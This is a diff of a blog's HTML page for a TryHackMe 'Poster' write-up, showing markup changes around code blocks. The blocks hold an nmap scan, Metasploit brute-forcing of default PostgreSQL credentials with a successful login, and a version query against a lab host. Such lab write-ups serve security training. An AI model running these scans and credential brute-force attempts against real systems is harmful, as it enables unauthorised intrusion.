@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Poster [TryHackMe] – Blog</title>
+    <title>Poster [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Poster [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/poster/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/poster/icon.png">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/poster/icon.png">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Poster [TryHackMe]">
     <meta property="twitter:description" content="The sys admin set up a rdbms in a safe way.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1821,7 +1821,7 @@
 The output of the scan can be seen below:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1851,42 +1851,42 @@ The output of the scan can be seen below:</p>
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">nmap -v -p- -A -T4 10.10.211.18
-
-Nmap scan report <span class="k">for</span> 10.10.211.18
-Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
-Not shown: <span class="m">65532</span> closed ports
-PORT     STATE SERVICE    VERSION
-22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> eb:3a:a3:4e:6f:10:00🆎ef:fc:c5:2b:0e:db:40:57 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp   open  http       Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span> http-methods: 
-<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
-<span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Poster CMS
-5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
-<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
-<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>ubuntu
-<span class="p">|</span> Public Key type: rsa
-<span class="p">|</span> Public Key bits: <span class="m">2048</span>
-<span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
-<span class="p">|</span> Not valid before: 2020-07-29T00:54:25
-<span class="p">|</span> Not valid after:  2030-07-27T00:54:25
-<span class="p">|</span> MD5:   da57 <span class="m">3213</span> e9aa <span class="m">9274</span> d0be c1b0 bbb2 0b09
-<span class="p">|</span>_SHA-1: 4e03 <span class="m">8469</span> 28f7 673b 2bb2 <span class="m">0440</span> 4ba9 e4d2 a0d0 5dd5
-<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -v -p- -A -T4 10.10.211.18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.211.18
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.071s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> eb:3a:a3:4e:6f:10:00🆎ef:fc:c5:2b:0e:db:40:57 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http       Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Poster CMS
+</span></span><span class="line"><span class="cl">5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-07-29T00:54:25
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2030-07-27T00:54:25
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   da57 <span class="m">3213</span> e9aa <span class="m">9274</span> d0be c1b0 bbb2 0b09
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 4e03 <span class="m">8469</span> 28f7 673b 2bb2 <span class="m">0440</span> 4ba9 e4d2 a0d0 5dd5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can see that the <strong>PostgreSQL</strong> service is open on the target and running version 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21</p>
 <h3 id="user-credentials-enumeration">User credentials enumeration</h3>
 <p>Metasploit offers auxiliary module which will attempt to <strong>brute-force</strong> the login to the <strong>PostgreSQL</strong> database using a list of default usernames and passwords.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1914,38 +1914,38 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 &gt; use auxiliary/scanner/postgres/postgres_login
-msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; show options 
-
-Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_login<span class="o">)</span>:
-
-   Name              Current Setting                                                               Required  Description
-   ----              ---------------                                                               --------  -----------
-   BLANK_PASSWORDS   <span class="nb">false</span>                                                                         no        Try blank passwords <span class="k">for</span> all users
-   BRUTEFORCE_SPEED  <span class="m">5</span>                                                                             yes       How fast to bruteforce, from <span class="m">0</span> to <span class="m">5</span>
-   DATABASE          template1                                                                     yes       The database to authenticate against
-   DB_ALL_CREDS      <span class="nb">false</span>                                                                         no        Try each user/password couple stored in the current database
-   DB_ALL_PASS       <span class="nb">false</span>                                                                         no        Add all passwords in the current database to the list
-   DB_ALL_USERS      <span class="nb">false</span>                                                                         no        Add all users in the current database to the list
-   PASSWORD                                                                                        no        A specific password to authenticate with
-   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
-   Proxies                                                                                         no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
-   RETURN_ROWSET     <span class="nb">true</span>                                                                          no        Set to <span class="nb">true</span> to see query result sets
-   RHOSTS                                                                                          yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
-   RPORT             <span class="m">5432</span>                                                                          yes       The target port
-   STOP_ON_SUCCESS   <span class="nb">false</span>                                                                         yes       Stop guessing when a credential works <span class="k">for</span> a host
-   THREADS           <span class="m">1</span>                                                                             yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
-   USERNAME                                                                                        no        A specific username to authenticate as
-   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing <span class="o">(</span>space-separated<span class="o">)</span> users and passwords, one pair per line
-   USER_AS_PASS      <span class="nb">false</span>                                                                         no        Try the username as the password <span class="k">for</span> all users
-   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
-   VERBOSE           <span class="nb">true</span>                                                                          yes       Whether to print output <span class="k">for</span> all attempts
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use auxiliary/scanner/postgres/postgres_login
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; show options 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_login<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name              Current Setting                                                               Required  Description
+</span></span><span class="line"><span class="cl">   ----              ---------------                                                               --------  -----------
+</span></span><span class="line"><span class="cl">   BLANK_PASSWORDS   <span class="nb">false</span>                                                                         no        Try blank passwords <span class="k">for</span> all users
+</span></span><span class="line"><span class="cl">   BRUTEFORCE_SPEED  <span class="m">5</span>                                                                             yes       How fast to bruteforce, from <span class="m">0</span> to <span class="m">5</span>
+</span></span><span class="line"><span class="cl">   DATABASE          template1                                                                     yes       The database to authenticate against
+</span></span><span class="line"><span class="cl">   DB_ALL_CREDS      <span class="nb">false</span>                                                                         no        Try each user/password couple stored in the current database
+</span></span><span class="line"><span class="cl">   DB_ALL_PASS       <span class="nb">false</span>                                                                         no        Add all passwords in the current database to the list
+</span></span><span class="line"><span class="cl">   DB_ALL_USERS      <span class="nb">false</span>                                                                         no        Add all users in the current database to the list
+</span></span><span class="line"><span class="cl">   PASSWORD                                                                                        no        A specific password to authenticate with
+</span></span><span class="line"><span class="cl">   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+</span></span><span class="line"><span class="cl">   Proxies                                                                                         no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   RETURN_ROWSET     <span class="nb">true</span>                                                                          no        Set to <span class="nb">true</span> to see query result sets
+</span></span><span class="line"><span class="cl">   RHOSTS                                                                                          yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">   RPORT             <span class="m">5432</span>                                                                          yes       The target port
+</span></span><span class="line"><span class="cl">   STOP_ON_SUCCESS   <span class="nb">false</span>                                                                         yes       Stop guessing when a credential works <span class="k">for</span> a host
+</span></span><span class="line"><span class="cl">   THREADS           <span class="m">1</span>                                                                             yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   USERNAME                                                                                        no        A specific username to authenticate as
+</span></span><span class="line"><span class="cl">   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing <span class="o">(</span>space-separated<span class="o">)</span> users and passwords, one pair per line
+</span></span><span class="line"><span class="cl">   USER_AS_PASS      <span class="nb">false</span>                                                                         no        Try the username as the password <span class="k">for</span> all users
+</span></span><span class="line"><span class="cl">   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+</span></span><span class="line"><span class="cl">   VERBOSE           <span class="nb">true</span>                                                                          yes       Whether to print output <span class="k">for</span> all attempts
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Before running this module we need to set  remote hosts option (RHOSTS). Then we can launch the module with the following command.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1973,33 +1973,33 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_login
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; run
-
-<span class="o">[</span>!<span class="o">]</span> No active DB -- Credential data will not be saved!
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - Login Successful: postgres:password@template1
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> No active DB -- Credential data will not be saved!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: :admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: postgres:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - Login Successful: postgres:password@template1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: scott:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:tiger@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:postgres@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 <span class="o">(</span>Incorrect: Invalid username or password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Used module goes through each username and password combination from the provided lists. After few failed combination we are left with one successful login credentials.</p>
 <hr />
@@ -2008,7 +2008,7 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_login
 <p>Let us use chosen module to verify the service version.  We can use the <code>setg</code> command for setting remote hosts option globally therefore we will not need to set this option every time we load a new module.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2025,26 +2025,26 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_login
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">sf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; use auxiliary/admin/postgres/postgres_sql
-msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; show options 
-
-Module options <span class="o">(</span>auxiliary/admin/postgres/postgres_sql<span class="o">)</span>:
-
-   Name           Current Setting   Required  Description
-   ----           ---------------   --------  -----------
-   DATABASE       template1         yes       The database to authenticate against
-   PASSWORD       postgres          no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
-   RETURN_ROWSET  <span class="nb">true</span>              no        Set to <span class="nb">true</span> to see query result sets
-   RHOSTS                           yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
-   RPORT          <span class="m">5432</span>              yes       The target port
-   SQL            <span class="k">select</span> version<span class="o">()</span>  no        The SQL query to execute
-   USERNAME       postgres          yes       The username to authenticate as
-   VERBOSE        <span class="nb">false</span>             no        Enable verbose output
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_login<span class="o">)</span> &gt; use auxiliary/admin/postgres/postgres_sql
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; show options 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/admin/postgres/postgres_sql<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name           Current Setting   Required  Description
+</span></span><span class="line"><span class="cl">   ----           ---------------   --------  -----------
+</span></span><span class="line"><span class="cl">   DATABASE       template1         yes       The database to authenticate against
+</span></span><span class="line"><span class="cl">   PASSWORD       postgres          no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
+</span></span><span class="line"><span class="cl">   RETURN_ROWSET  <span class="nb">true</span>              no        Set to <span class="nb">true</span> to see query result sets
+</span></span><span class="line"><span class="cl">   RHOSTS                           yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">   RPORT          <span class="m">5432</span>              yes       The target port
+</span></span><span class="line"><span class="cl">   SQL            <span class="k">select</span> version<span class="o">()</span>  no        The SQL query to execute
+</span></span><span class="line"><span class="cl">   USERNAME       postgres          yes       The username to authenticate as
+</span></span><span class="line"><span class="cl">   VERBOSE        <span class="nb">false</span>             no        Enable verbose output
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2057,18 +2057,18 @@ Module options <span class="o">(</span>auxiliary/admin/postgres/postgres_sql<spa
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; run
-<span class="o">[</span>*<span class="o">]</span> Running module against 10.10.211.18
-
-Query Text: <span class="s1">&#39;select version()&#39;</span>
-<span class="o">==============================</span>
-
-    version
-    -------
-    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.12<span class="o">)</span> 5.4.0 20160609, 64-bit
-
-<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
-</code></pre></td></tr></table>
